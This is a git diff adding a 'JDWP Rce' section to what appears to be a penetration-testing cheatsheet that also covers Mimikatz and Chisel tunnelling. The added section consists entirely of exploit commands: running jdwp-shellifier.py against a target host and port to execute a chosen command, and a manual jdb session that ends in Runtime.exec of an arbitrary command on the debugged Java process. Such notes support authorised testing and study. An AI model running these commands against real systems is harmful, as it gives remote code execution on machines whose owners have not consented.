@@ -52,6 +52,7 @@ Expect Spanglish, this is a cheatsheet.
    - [Using OpenSSH](#using-openssh)
    - [Using Chisel](#using-chisel)
 - [Mimikatz](#mimikatz)
+- [Java Debugging Wire Protocol RCE](#jdwp-rce)
 
  
 
@@ -1540,3 +1541,21 @@ lsadump::sam SystemWeb02Backup.hiv SamWeb02Backup.hiv
 ```
 
 [Back to top](#index)
+
+## JDWP Rce
+
+```
+# Using jdwp-shellifier.py
+python3 jdwp-shellifier.py #by default it targets 0.0.0.0 on port 8000
+python3 jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'whatever_command'
+
+# Manuallly, it doesn't alwas works this way.
+jdb -attach 8000
+trace go methods
+stop in java.lang.String().indexOf(int)
+print new java.lang.String("Blah").length() # this should give us --> new java.lang.String("Blah").length() = 4
+print new java.lang.Runtime().exec("<cmd>") # executes the command.
+```
+
+[Back to top](#index)
+
